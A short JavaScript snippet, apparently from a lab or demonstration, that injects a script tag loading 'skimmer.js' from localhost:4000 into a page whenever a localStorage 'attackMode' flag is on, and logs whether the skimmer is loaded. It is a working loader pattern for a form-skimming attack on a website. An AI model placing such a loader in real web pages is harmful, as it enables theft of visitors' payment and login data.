(function() {
  if (localStorage.getItem('attackMode') === 'on') {
    const script = document.createElement('script');
    script.src = 'http://localhost:4000/skimmer.js';
    document.head.appendChild(script);
    console.log('⚠️ Attack mode ON: Skimmer loaded');
  } else {
    console.log('✅ Attack mode OFF: No skimmer');
  }
})();
